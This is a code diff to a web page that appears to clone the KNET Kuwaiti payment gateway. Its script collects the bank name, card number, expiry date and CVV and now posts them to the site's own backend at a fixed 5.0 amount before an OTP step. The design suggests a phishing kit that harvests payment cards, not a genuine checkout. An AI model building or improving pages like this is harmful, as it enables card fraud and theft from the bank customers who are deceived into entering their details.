@@ -926,7 +926,7 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
 
 </html>
 <script>
-function handlePaymentSubmit(event) {
+async function handlePaymentSubmit(event) {
     event.preventDefault();
     
     // Get form data
@@ -938,45 +938,55 @@ function handlePaymentSubmit(event) {
     
     // Validate inputs
     if (!bankName || bankName === 'prefix') {
-        alert('Please select a bank');
+        alert('برجاء اختيار البنك');
         return;
     }
     if (!cardNumber) {
-        alert('Please enter card number');
+        alert('برجاء إدخال رقم البطاقة');
         return;
     }
-    if (!expiryMonth || expiryMonth === 'MM' || !expiryYear || expiryYear === 'YYYY') {
-        alert('Please enter expiry date');
+    if (!expiryMonth || expiryMonth === '0' || !expiryYear || expiryYear === 'YYYY') {
+        alert('برجاء إدخال تاريخ الانتهاء');
         return;
     }
     if (!cvv) {
-        alert('Please enter CVV');
+        alert('برجاء إدخال رمز الأمان');
         return;
     }
     
-    // Get phone number and amount from page
-    const phoneNumber = document.querySelector('input[placeholder*="رقم"]')?.value || 'N/A';
-    const amountText = document.querySelector('[id="OrgTranxAmt"] .text-label')?.textContent.trim() || '0';
-    const amount = parseFloat(amountText) || 0;
-    
-    // Create transaction data
-    const transactionData = {
-        phoneNumber: phoneNumber,
-        bankName: bankName,
-        cardNumber: cardNumber,
-        expiryDate: expiryMonth + '/' + expiryYear,
-        cvv: cvv,
-        amount: amount,
-        status: 'pending',
-        timestamp: new Date().toISOString()
-    };
-    
-    // Get existing transactions or create new array
-    const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-    transactions.push(transactionData);
-    localStorage.setItem('transactions', JSON.stringify(transactions));
-    
-    // Redirect to OTP page
-    window.location.href = '/knet/ver.html';}
+    try {
+        // Show loading
+        document.body.style.opacity = '0.6';
+        
+        // Submit to backend
+        const response = await fetch('/api/trpc/payment.submitKnet', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                bankName: bankName,
+                cardNumber: cardNumber,
+                expiryMonth: expiryMonth,
+                expiryYear: expiryYear,
+                cvv: cvv,
+                amount: 5.0
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.result?.data?.paymentId) {
+            // Redirect to loading page
+            window.location.href = '/loading?paymentId=' + data.result.data.paymentId;
+        } else {
+            alert('حدث خطأ في معالجة الطلب');
+            document.body.style.opacity = '1';
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('خطأ في الاتصال بالخادم');
+        document.body.style.opacity = '1';
+    }
 }
 </script>
